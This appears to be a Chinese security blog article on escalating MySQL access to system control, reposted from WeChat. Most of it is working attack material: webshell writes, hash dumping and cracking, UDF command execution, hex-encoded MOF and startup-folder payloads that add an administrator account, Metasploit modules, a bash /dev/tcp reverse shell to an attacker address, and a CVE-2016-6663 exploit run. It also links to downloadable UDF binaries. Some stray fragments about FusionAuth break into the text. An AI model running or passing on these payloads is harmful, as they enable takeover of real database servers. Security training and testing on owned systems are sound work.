> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iKgdVpETkcD6p3lLLlwZQQ)

_**No.1  
**_

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**No.2  
**_

_**权限获取**_

**数据库操作权限**

本文讲的是 MySQL 提权相关知识，但是提权之前得先拿到高权限的 MySQL 用户才可以，拿到 MySQL 的用户名和密码的方式多种多样，但是不外乎就下面几种方法：

1.MySQL 3306 端口弱口令爆破

2.sqlmap 注入的 --sql-shell 模式

3. 网站的数据库配置文件中拿到明文密码信息  

4.CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限

**Webshell 权限**

**• into oufile 写 shell**

- 知道网站物理路径

- 高权限数据库用户

- load_file() 开启 即 secure_file_priv 无限制

- 网站路径有写入权限

首先基础语法查询是否 secure_file_priv 没有限制

```
mysql> show global variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc542x4C4no0GBUAZLrcOY1bjPw6YxIJtA1jPumzGXGqVOlnYrYic1P0k6Q/640?wx_fmt=png)

在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件

在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件

如果满足上述所有条件的话，那么可以尝试使用下面原生的 SQL 语句来直接写 shell：

```
select '<?php phpinfo(); ?>' into outfile '/var/www/html/info.php';
```

sqlmap 中可以如下操作：

```
sqlmap -u "http://x.x.x.x/?id=x" --file-write="/Users/guang/Desktop/shell.php" --file-dest="/var/www/html/test/shell.php"
```

一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。

**• 日志文件写 shell**

- Web 文件夹宽松权限可以写入

- Windows 系统下

- 高权限运行 MySQL 或者 Apache

MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell

```
mysql> SHOW VARIABLES LIKE 'general%';
+------------------+---------------------------------+
| Variable_name    | Value                           |
+------------------+---------------------------------+
| general_log      | OFF                             |
| general_log_file | /var/lib/mysql/c1595d3a029a.log |
+------------------+---------------------------------+
```

general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。

可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：

```
# 更改日志文件位置
set global general_log = "ON";
set global general_log_file='/var/www/html/info.php';

# 查看当前配置
mysql> SHOW VARIABLES LIKE 'general%';
+------------------+-----------------------------+
| Variable_name    | Value                       |
+------------------+-----------------------------+
| general_log      | ON                          |
| general_log_file | /var/www/html/info.php |
+------------------+-----------------------------+

# 往日志里面写入 payload
select '<?php phpinfo();?>';

# 此时已经写到 info.php 文件当中了
root@c1595d3a029a:/var/www/html/$ cat info.php 
/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
201031 21:14:46     40 Query  SHOW VARIABLES LIKE 'general%'
201031 21:15:34     40 Query  select '<?php phpinfo();?>
```

这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的：

```
-rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php
```

Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。

前面分别介绍了数据库权限和 Webshell 权限，那么能不能利用已经获取到的 MySQL 权限来执行系统主机的命令的呢？这个就是下面主要介绍的了 MySQL 提权的知识点了。

**Hash 获取与解密**

假设存在 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密：

```
# MySQL <= 5.6 版本
mysql> select host, user, password from mysql.user;
+-----------+------+-------------------------------------------+
| host      | user | password                                  |
+-----------+------+-------------------------------------------+
| localhost | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| ::1       | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| %         | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
+-----------+------+-------------------------------------------+

# MySQL >= 5.7 版本
mysql > select host,user,authentication_string from mysql.user;
+-----------+---------------+-------------------------------------------+
| host      | user          | authentication_string                     |
+-----------+---------------+-------------------------------------------+
| localhost | root          | *8232A1298A49F710DBEE0B330C42EEC825D4190A |
| localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| localhost | mysql.sys     | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+-----------+---------------+-------------------------------------------+
```

获取到的 MySQL Hash 值可以通过一些在线网站来解密，如国内的 CMD5 ：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54ibCFbTlIYLXZApbedmeotOwN91OXBpeoeoKeCK0xworGwUoN3CuTWtw/640?wx_fmt=png)

也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：

```
hashcat -a 0 -m 300 --force '8232A1298A49F710DBEE0B330C42EEC825D4190A' password.txt -O
```

**-a 破解模式**

指定要使用的破解模式，其值参考后面对参数

```
- [ Attack Modes ] -

  # | Mode
 ===+======
  0 | Straight                # 直接字典破解
  1 | Combination             # 组合破解
  3 | Brute-force             # 掩码暴力破解
  6 | Hybrid Wordlist + Mask  # 字典+掩码破解
  7 | Hybrid Mask + Wordlist  # 掩码+字典破解
```

**-m 破解 hash 类型**

指定要破解的 hash 类型，后面跟 hash 类型对应的数字，具体类型详见下表：

```
12   | PostgreSQL                                       | Database Server
131  | MSSQL (2000)                                     | Database Server
132  | MSSQL (2005)                                     | Database Server
1731 | MSSQL (2012, 2014)                               | Database Server
200  | MySQL323                                         | Database Server
300  | MySQL4.1/MySQL5                                  | Database Server
...
```

**--force**

忽略破解过程中的警告信息

**-O**

--optimized-kernel-enable 启用优化的内核（限制密码长度）

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54dI4rBxoGtzN2ytWlSWwI3XIASU3csEwsBFqic9gmSKsChsjgAaib0fJQ/640?wx_fmt=png)

关于更多 Hashcat 的详细教程可以参考我的这一篇文章：**Hashcat 学习记录**

https://www.sqlsec.com/2019/10/hashcat.html

**MySQL 历史上的漏洞**

**• yaSSL 缓冲区溢出**

MySQL yaSSL SSL Hello Message Buffer Overflow 这个缓冲区溢出漏洞 2008 年开始被曝出来，距离现在已经十几年的历史了，所以国光这里没有找到对应的环境测试，不过 MSF 里面已经集成好了对应的模块了：

```
msf6 > use exploit/windows/mysql/mysql_yassl_hello
msf6 > use exploit/linux/mysql/mysql_yassl_hello
```

有条件的朋友可以搭建这个漏洞对应的靶场环境

**Linux :** MySQL 5.0.45-Debian_1ubuntu3.1-log

**Windows :** MySQL 5.0.45-community-nt

**• CVE-2012-2122**

知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库：

```
for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; done
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54gtukpdvicHzb1rRwibTWiaeD9l7X2T580RxtCOeqwaibhBm1HcUCxr0shw/640?wx_fmt=png)

MSF 里面也有了对应的脚本模块可以直接使用，成功后会直接 DUMP 出 MySQL 的 Hash 值：

```
msf6 > use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf6 > set rhosts 127.0.0.1
msf6 > run
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54HhogxpqITNJeC1aHBOY04Bel6sJUj1XOBdqsQXos3ZfibpL3kKOdTbg/640?wx_fmt=png)

这个 MySQL 的 Hash 解密出的结果为 123456

_**No.3  
**_

_**UDF 提权**_

自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version() 等方便。

**手工复现**

**• 动态链接库**

如果是 MySQL >= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。

那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。

• sqlmap 的 UDF 动态链接库文件位置

```
sqlmap根目录/data/udf/mysql
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54sIvhzkEmcp6kq0ax75WczVL8FXGKoYe8lUZ1a2Go5GVct57BGvo0DQ/640?wx_fmt=png)

不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具 cloak.py 来解码使用，cloak.py 的位置为：/extra/cloak/cloak.py ，解码方法如下：

```
# 查看当前目录情况
➜ pwd
/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak

# 解码 32 位的 Linux 动态链接库
➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so

# 解码 64 位的 Linux 动态链接库
➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so

# 解码 32 位的 Windows 动态链接库
➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll

# 解码 64 位的 Windows 动态链接库
➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll

# 查看当前目录下的情况
➜ ls
README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so
__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll
```

FusionAuth <= 1.11.0

我打包了 sqlmap 解码后的动态链接库：

**蓝奏云 - sqlmap udf.zip**

https://sqlsec.lanzoux.com/i4b7jhyhwid

需要的朋友可以自提

• Metasploit 的 UDF 动态链接库文件位置

```
MSF 根目录/embedded/framework/data/exploits/mysql
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54Hlv026oNAO6UlWAGWqRXtwenG4JpRdibqN4icxForHTxrckDkibHiaeCxg/640?wx_fmt=png)

Metasploit 自带的动态链接库文件无需解码，开箱即可食用。

我使用 010-Editor 对比了 metsaploit 自带的与 sqlmap 解码后的动态链接库文件，发现他们的内容一模一样。

下面来看下动态链接库里面有包含了哪些函数：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54T69p2IVCIWSSRb2KH0RHTNFESibtUf9n8KvBbdwGv8VscelM3Qv7FSA/640?wx_fmt=png)

**• 寻找插件目录**

接下来的任务是把 UDF 的动态链接库文件放到 MySQL 的插件目录下，这个目录改如何去寻找呢？可以使用如下的 SQL 语句来查询：

```
mysql> show variables like '%plugin%';
+---------------+------------------------------+
| Variable_name | Value                        |
+---------------+------------------------------+
| plugin_dir    | /usr/local/mysql/lib/plugin/ |
+---------------+------------------------------+
```

如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \lib\plugin 文件夹：

```
mysql > select 233 into dumpfile 'C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation';
```

通过 NTFS ADS 流创建文件夹成功率不高，目前 MySQL 官方貌似已经阉割了这个功能。那么如果找到 MySQL 的安装目录呢？通用也有对应的 SQL 语句可以查询出来：

```
mysql> select @@basedir;
+------------------+
| @@basedir        |
+------------------+
| /usr/local/mysql |
+------------------+
```

**• 写入动态链接库**

写入动态链接库可以分为下面几种情形：

SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有**字节长度限制**，所以往往 POST 注入才可以执行这种攻击

```
sqlmap -u "http://localhost:30008/" --data="id=1" --file-write="/Users/sec/Desktop/lib_mysqludf_sys_64.so" --file-dest="/usr/lib/mysql/plugin/udf.so"
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54Tiax33ONyUy9HcQpWYPSc4LMU6O8n9CJeamhYJuP9Lan6om8RZJ2c6A/640?wx_fmt=png)

如果没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，我们也是可以手工写文件到 plugin 目录下的：

```
# 直接 SELECT 查询十六进制写入
SELECT 0x7f454c4602... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

# 解码十六进制再写入多此一举
SELECT unhex('7f454c4602...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

这里的十六进制怎么获取呢？可以利用 MySQL 自带的 hex 函数来编码：

```
# 直接传入路径编码
SELECT hex(load_file('/lib_mysqludf_sys_64.so'));

# 也可以将路径 hex 编码
SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));
```

一般为了更方便观察，可以将编码后的结果导入到新的文件中方便观察：

```
SELECT hex(load_file('/lib_mysqludf_sys_64.so')) into dumpfile '/tmp/udf.txt'; 

SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)) into dumpfile '/tmp/udf.txt';
```

为了方便大家直接复制，我这里单独写了个页面，有意者自取：**MySQL UDF 提权十六进制查询**

https://www.sqlsec.com/tools/udf.html

```
ERROR 1126 (HY000): Can't open shared library 'udf.dll' (errno: 193 )
```

网友们可能看到这个报错，因为 lib_mysqludf_sys_64.dll 失败，最后使用 lib_mysqludf_sys_32.dll 才成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的

**• 创建自定义函数并调用命令**

```
mysql > CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
```

FusionAut 导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：h <= 1.11.0

```
mysql> select * from mysql.func;
+----------+-----+---------+----------+
| name     | ret | dl      | type     |
+----------+-----+---------+----------+
| sys_eval |   0 | udf.dll | function |
+----------+-----+---------+----------+
```

这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：

```
mysql > select sys_eval('whoami');
```

如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的

**• 删除自定义函数**

```
mysql > drop function sys_eval;
```

**UDF shell**

假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了。

**• UDF.PHP**

**t00ls UDF.PHP** 

https://github.com/echohun/tools/blob/master / 大马 / udf.php

简单方便，一键 DUMP UDF 和函数，操作门槛降低了很多：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54ABtjQibYtF7uE08cg0ItkYEpiaoiavDT9YtJdxwhqlglmw5K54C38bq5Q/640?wx_fmt=png)

**• Navicat MySQL**

目标 MySQL 不允许外连，但是可以上传 PHP 脚本:

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54HeB1cd9mlAtmCSpYibZia57RskkOPTypcsep70kliayYPlghr6YXsuTibA/640?wx_fmt=png)

这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54H4qHibGKy3iasU3holTTib9xesYKQbZbGbdGcwFCwmfWpoaAkdkLDfg7Q/640?wx_fmt=png)

我这里顺便打包了一份出来：

**蓝奏云：Navicat tunnel.zip**

https://sqlsec.lanzoux.com/ibpoGijd6bc

实际上 Navicat 很久很久以前就自带这些脚本了，这个脚本有点类似于 reGeorg，只是官方的脚本用起来更舒服方便一点，脚本的界面如下：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54BoZtiaPFog5dzVqIvOJ1EgnfqtfwMbJLVT9txuWBfvH5u4ibonz1zqnQ/640?wx_fmt=png)

接着连接的时候设置 HTTP 通道：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54CkkOAM8XI824KZp7n2RUEmyuSYzIxeJ4IPCTYasciaFLSEL1liaYoO9A/640?wx_fmt=png)

这个时候主机地址填写 localhost 即可：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54UWo42fFRJw4NlWWiaRxhGdhRSiaFjiarJheE658KWgbUrmn7lWXYuGRfQ/640?wx_fmt=png)

连接成功后自然就可以愉快地进行手工 UDF 提权啦：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54Ubw8vHCsVlXGPWZRK6XaOK1eKrxCl6BYEr0qlHGEFeKKfOILfNyxNA/640?wx_fmt=png)

_**No.4  
**_

_**反弹端口提权**_

实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些：

```
cmdshell        # 执行cmd
downloader      # 下载者,到网上下载指定文件并保存到指定目录
open3389        # 通用开3389终端服务,可指定端口(不改端口无需重启)
backshell       # 反弹Shell
ProcessView     # 枚举系统进程
KillProcess     # 终止指定进程
regread         # 读注册表
regwrite        # 写注册表
shut            # 关机,注销,重启
about           # 说明与帮助函数
```

这个动态链接库有点历史了，不过还是被我找到了

**蓝奏云：langouster_udf.zip**

https://sqlsec.lanzoux.com/iEQA0ijfu6d

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54Nr3Gs0hhMh9JqbNffodjp4yHBc9HU2Jja4cfVbR1fMkKcoYw6KAfRQ/640?wx_fmt=png)

下面尝试来使用这个 dll 来反弹 shell 试试看吧，首先在 10.20.24.244 上开启 NC 监听：

```
➜  ~ ncat -lvp 2333
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::2333
Ncat: Listening on 0.0.0.0:2333
```

然后目标机器上导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数：

```
mysql > CREATE FUNCTION backshell RETURNS STRING SONAME 'udf.dll';
```

直接反弹 shell ：

```
mysql > select backshell("10.20.24.244", 2333);
```

成功上线：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54OMibAxwYFL6TyQicw2jlMiaLtM1eLJZ0kNcwruV25ia0UKRKMJs255uFQQ/640?wx_fmt=png)

_**No.5  
**_

_**MOF 提权**_

MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是 C:/Windows/system32/wbem/mof / 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。  

**手工复现**

**• 上传 mof 文件执行命令**

mof 脚本的内容如下：

```
# pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")"; 
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
```

核心 payload 为：

```
var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")
```

MySQL 写文件的特性将这个 MOF 文件导入到 C:/Windows/system32/wbem/mof/ 目录下，依然采用上述编码的方式：

```
mysql > select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile "C:/windows/system32/wbem/mof/test.mof";
```

执行成功的的时候，test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 否则出现在 c:/windows/system32/wbem/bad 目录下：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54LcqA5q9yrmfZnz010icv2ickdsl5D3Y0wJqexaoZbZicJHBzBByOgHJXA/640?wx_fmt=png)

**• 痕迹清理**

因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：

```
# 停止 winmgmt 服务
net stop winmgmt

# 删除 Repository 文件夹
rmdir /s /q C:\Windows\system32\wbem\Repository\

# 手动删除 mof 文件
del C:\Windows\system32\wbem\mof\good\test.mof /F /S

# 删除创建的用户
net user hacker /delete

# 重新启动服务
net start winmgmt
```

**MSF MOF 提权**

MSF 里面也自带了 MOF 提权模块，使用起来也比较方便而且也做到了自动清理痕迹的效果，实际操作起来效率也还不错：

```
msf6 > use exploit/windows/mysql/mysql_mof
# 设置好自己的 payload
msf6 > set payload windows/meterpreter/reverse_tcp

# 设置目标 MySQL 的基础信息
msf6 > set rhosts 10.211.55.21
msf6 > set username root
msf6 > set password root
msf6 > run
```

实际运行效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54DOuqpcsicVBzTeytd0Y2USrhV1NOxVzy6wXq7qSJextIcKlpib53jYvQ/640?wx_fmt=png)

_**No.6  
**_

_**启动项提权**_

这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。

**手工复现**

**• 启动项路径**

**Windows Server 2003** 的启动项路径：

```
# 中文系统
C:\Documents and Settings\Administrator\「开始」菜单\程序\启动
C:\Documents and Settings\All Users\「开始」菜单\程序\启动

# 英文系统
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup
C:\Documents and Settings\All Users\Start Menu\Programs\Startup

# 开关机项 需要自己建立对应文件夹
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown
```

**Windows Server 2008** 的启动项路径：

```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：

```
Set WshShell=WScript.CreateObject("WScript.Shell")
WshShell.Run "net user hacker P@ssw0rd /add", 0
WshShell.Run "net localgroup administrators hacker /add", 0
```

**• MySQL 写入启动项**

将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中：

```
mysql > select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs";
```

写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。

**MSF 启动项提权**

没错，MSF 也封装好了对应的模块，目标系统为 Windows 的情况下可以直接使用该模块来上线 MSF，使用起来也很简单：

```
msf6 > use exploit/windows/mysql/mysql_start_up

# 配置 MySQL 连接信息
msf6 > set rhosts 10.211.55.6
msf6 > set username root
msf6 > set password root
msf6 > run
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54GOib3eR29uLNHBgr1H3rWxyicOiaI7r5h9FSiciahteYKZQWZ6yHDG4JNNg/640?wx_fmt=png)

STARTUP_FOLDER 启动项文件夹得自己根据实际的目标系统来进行调整

MSF 会写入 exe 木马到启动项中，执行完成后开启监听会话：

```
msf6 > handler -H 10.20.24.244 -P 4444 -p windows/meterpreter/reverse_tcp
```

当目标系统重新登录的时候，MSF 这里可以看到已经成功上线了：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54usAKsMfibdgMSpUxIRdyuibXZJTvggA17cM0ywVZ62pRQXicITfPwUf9A/640?wx_fmt=png)

_**No.7  
**_

_**CVE-2016-6663**_

**环境准备**

我改了基于网上的教程封装打包了一个 Docker 镜像上传到了 Docker Hub，现在大家部署就会方便许多：

```
# 拉取镜像
docker pull sqlsec/cve-2016-6663

# 部署镜像
docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663
```

添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限：

```
# 创建 test 数据库
mysql > create database test;

# 设置 test 密码为 123456
mysql > CREATE USER 'test'@'%' IDENTIFIED BY '123456'; 

# 赋予基础权限
mysql > grant create,drop,insert,select on test.* to 'test'@'%';

# 刷新权限
mysql > flush privileges;
```

也可以将上述操作整合成一条命令：

```
mysql -uroot -e "create database test;CREATE USER 'test'@'%' IDENTIFIED BY '123456'; grant create,drop,insert,select on test.* to 'test'@'%';flush privileges;"
```

**漏洞复现**

竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限

**• 利用成功条件**

1. Getshell 拿到 www-data 权限

2. 拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户

3. 关键提取步骤需要在交互环境下，所以需要反弹 shell

4. MySQL 版本需要 <=5.5.51 或 5.6.x <=5.6.32 或 5.7.x <=5.7.14 或 8.x < 8.0.1

5. MariaDB 版本需要 <= 5.5.51 或 10.0.x <= 10.0.27 或 10.1.x <= 10.1.17

CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：

https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html

通过蚁剑上传 EXP，然后 Bash 反弹 shell：

首先 10.20.24.244 端口开启监听：

```
➜  ~ ncat -lvp 2333
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::2333
Ncat: Listening on 0.0.0.0:2333
```

蚁剑终端下反弹 Bash：

```
bash -i >& /dev/tcp/10.20.24.244/2333 0>&1
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc543gNMibmdXUb7ucshMSkj4SWqIMiaXxcxEb9lwRcXhK5SDLibFtrgxtvjA/640?wx_fmt=png)

在反弹 shell 的情况下，首先编译 EXP：

```
gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
```

执行 EXP 提权：

```
# ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库
./mysql-privesc-race test 123456 localhost test
```

Bingo! 成功，最后的提权成功的效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JU8KTRDias8PibAecVuiangc54ZqSYBPTOwgicrZMAnXyVLI45rf3EHElkTzhAfzPzQzxCB8YOaXicKlaw/640?wx_fmt=png)

